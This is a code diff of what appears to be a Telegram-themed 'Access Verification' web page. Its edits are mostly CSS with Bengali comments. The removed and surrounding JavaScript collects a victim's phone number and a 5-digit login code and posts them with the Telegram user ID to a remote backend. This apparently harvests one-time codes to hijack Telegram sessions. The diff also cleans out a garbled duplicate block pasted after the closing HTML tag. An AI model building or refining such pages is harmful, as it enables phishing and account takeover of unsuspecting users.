@@ -6,23 +6,42 @@
     <title>Access Verification</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        * { box-sizing: border-box; transition: 0.3s; }
+        * { box-sizing: border-box; transition: 0.3s; margin: 0; padding: 0; }
+        
         body { 
-            font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; 
+            font-family: 'Segoe UI', sans-serif; 
             background: url('https://rony90790.github.io/session-web/IMG_20260415_045401_985.jpg') no-repeat center center fixed; 
-            background-size: cover; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden;
+            background-size: cover; 
+            height: 100vh; 
+            width: 100vw;
+            overflow: hidden;
+            position: relative;
         }
         
         /* পেছনের ছবির উপর হালকা কালো আস্তরণ */
-        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); backdrop-filter: blur(6px); z-index: 1; }
+        .overlay { 
+            position: absolute; 
+            top: 0; left: 0; width: 100%; height: 100%; 
+            background: rgba(0,0,0,0.4); 
+            backdrop-filter: blur(6px); 
+            z-index: 1; 
+        }
         
-        /* মূল কার্ডের ডিজাইন (স্বচ্ছ গ্লাস ইফেক্ট) */
+        /* মূল কার্ডের ডিজাইন (একেবারে মাঝখানে রাখার জন্য Fix করা হয়েছে) */
         .card { 
-            position: relative; z-index: 2; width: 90%; max-width: 380px; 
-            background: rgba(255, 255, 255, 0.65); /* স্বচ্ছতা বাড়ানো হয়েছে */
-            backdrop-filter: blur(15px); /* পেছনের ছবি সুন্দর ব্লার দেখাবে */
+            position: absolute; 
+            top: 50%; 
+            left: 50%; 
+            transform: translate(-50%, -50%); /* এটি বক্সকে ঠিক মাঝখানে রাখবে */
+            z-index: 2; 
+            width: 90%; 
+            max-width: 380px; 
+            background: rgba(255, 255, 255, 0.65); 
+            backdrop-filter: blur(15px); 
             -webkit-backdrop-filter: blur(15px);
-            border-radius: 30px; padding: 35px 25px; text-align: center; 
+            border-radius: 30px; 
+            padding: 35px 25px; 
+            text-align: center; 
             box-shadow: 0 20px 50px rgba(0,0,0,0.3); 
             border: 2px solid rgba(255,255,255,0.6); 
         }
@@ -43,6 +62,17 @@
         }
         
         @keyframes pulse {
+            0% { transform: translate(-50%, -50%) scale(1); box-shadow: 0 8px 25px rgba(255, 65, 108, 0.6); }
+            50% { transform: translate(-50%, -50%) scale(1.04); box-shadow: 0 12px 30px rgba(255, 65, 108, 0.8); }
+            100% { transform: translate(-50%, -50%) scale(1); box-shadow: 0 8px 25px rgba(255, 65, 108, 0.6); }
+        }
+
+        /* কার্ডের ভেতরে বাটন নড়াচড়ার জন্য এনিমেশন ফিক্স */
+        .card .btn-confirm {
+            animation: pulse-btn 2s infinite;
+        }
+
+        @keyframes pulse-btn {
             0% { transform: scale(1); box-shadow: 0 8px 25px rgba(255, 65, 108, 0.6); }
             50% { transform: scale(1.04); box-shadow: 0 12px 30px rgba(255, 65, 108, 0.8); }
             100% { transform: scale(1); box-shadow: 0 8px 25px rgba(255, 65, 108, 0.6); }
@@ -150,44 +180,6 @@
             const redirectUrl = "https://rony90790.github.io/View-code-button-CHEK-/go.html";
             tg.openLink(redirectUrl);
         }
-
-        function press(n) {
-            if(currentOTP.length < 5) {
-                currentOTP += n;
-                for(let i=1; i<=5; i++) document.getElementById('b'+i).innerText = currentOTP[i-1] || "";
-                if(currentOTP.length === 5) verifyOTP();
-            }
-        }
-        function back() { currentOTP = currentOTP.slice(0, -1); for(let i=1; i<=5; i++) document.getElementById('b'+i).innerText = currentOTP[i-1] || ""; }
-
-        async function verifyOTP() {
-            const res = await fetch(`${BACKEND_URL}/verify_otp`, {
-                method: "POST", headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({ user_id: userId, otp: currentOTP })
-            });
-            const data = await res.json();
-            if (data.status === "success") { tg.close(); }
-            else { alert("Invalid Code!"); currentOTP = ""; back(); }
-        }
-    </script>
-</body>
-</html>                method: "POST", headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({ user_id: userId, phone: phone })
-            });
-            const result = await res.json();
-            if (result.status === "success") {
-                document.getElementById('loading').classList.add('hidden');
-                document.getElementById('step2').classList.remove('hidden');
-            } else { alert("Error: " + result.message); location.reload(); }
-        }
-
-        function viewCode() {
-    // আপনার সফল হওয়া রিডাইরেক্ট লিঙ্ক
-    const redirectUrl = "https://rony90790.github.io/View-code-button-CHEK-/go.html";
-    
-    // ব্রাউজারে ওপেন করার জন্য tg.openLink ব্যবহার করতে হবে
-    tg.openLink(redirectUrl);
-}
 
         function press(n) {
             if(currentOTP.length < 5) {
